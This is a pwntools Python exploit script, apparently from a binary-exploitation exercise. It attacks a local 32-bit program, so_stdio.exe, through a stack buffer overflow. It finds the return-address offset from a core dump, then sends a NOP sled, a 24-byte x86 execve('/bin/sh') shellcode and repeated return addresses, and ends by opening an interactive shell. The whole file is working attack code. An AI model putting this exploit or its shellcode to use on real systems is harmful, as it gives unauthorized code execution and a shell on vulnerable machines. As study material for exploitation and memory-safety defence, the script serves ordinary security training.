#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./so_stdio.exe
from pwn import *

# Set up pwntools for the correct architecture
target_program = './so_stdio.exe'
exe = context.binary = ELF(target_program)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

# https://docs.pwntools.com/en/stable/util/cyclic.html
# create 200 characters cyclic length

io = start()
# find the offset
io.sendline(cyclic(200, n=4))
io.wait() #wait until tube is closed and coredump file is generated

core = io.corefile
offset = cyclic_find(core.eip, n=4)
print(f'Offset of buffer to EIP or the return address is: {offset}')

payload_len = offset+4 #cyclic_find(core.read(core.esp, 4), n=4) # esp = eip+4
print(f'payload_len = {payload_len}')
print(f'ESP is at {core.esp:#010x}')
print(f'EIP contains {core.eip:#010x}')

# open next tube
io = start()

# Find the base address of buffer
# base address is printed to stdout; just grab it
io.recvuntil(' at ')
address = int(io.recvline(False), 16)
print(f'{address=:#010x}')
address1 = core.esp-payload_len
print(f'{address1=:#010x}')

repeat_ret_address = p32(address)*5

# get the shellcode
#shellcode_user = asm(shellcraft.sh())
#print(hexdump(shellcode_user))

# x86/linux/exec: 24 bytes; copied from shellcode/x86-linux-sh.py file

shellcode_user = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    b"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)


sled_len = payload_len - len(repeat_ret_address)-len(shellcode_user)
NOPSled = b'\x90'*sled_len # asm('nop')
payload = NOPSled+shellcode_user+repeat_ret_address
io.sendline(payload)

# get shell
#io.sendline(b'id')
#print(io.recvline())

io.interactive()
